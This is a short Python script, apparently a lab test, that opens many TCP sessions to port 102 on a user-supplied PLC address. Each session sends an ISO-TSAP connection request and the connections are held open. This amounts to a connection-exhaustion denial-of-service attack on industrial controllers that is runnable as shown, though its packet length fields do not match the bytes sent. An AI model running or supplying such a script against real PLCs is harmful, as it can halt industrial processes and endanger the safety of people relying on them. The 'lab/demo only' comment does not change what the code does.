# test.py
import socket
import time
from typing import List

# Simple TPKT + COTP CR (lab/demo only; not a full S7Comm handshake).
TPKT_COTP_CR = bytes.fromhex(
    "03 00 00 16"          # TPKT: version=3, length=0x16
    "11 E0 00 00 00 01"    # COTP: CR
    "00 C1 02 01 00"       # Example Src TSAP
    "C2 02 01 02"          # Example Dst TSAP
    .replace(" ", "")
)

def open_many(ip: str, n: int = 20, hold: int = 20) -> None:
    socks: List[socket.socket] = []
    try:
        for i in range(n):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, 102))
            s.sendall(TPKT_COTP_CR)
            try:
                _ = s.recv(64)
            except Exception:
                pass
            socks.append(s)
            print(f"[{i+1}/{n}] connected")
            time.sleep(0.02)
        print(f"Holding {len(socks)} sockets for {hold}s. Ctrl+C to stop.")
        time.sleep(hold)
    except KeyboardInterrupt:
        print("\nInterrupted.")
    finally:
        for s in socks:
            try:
                s.close()
            except Exception:
                pass
        print("Closed all sockets.")

if __name__ == '__main__':
    target_ip = input('Target PLC IP (default 192.168.0.10): ').strip() or '192.168.0.10'
    open_many(target_ip)
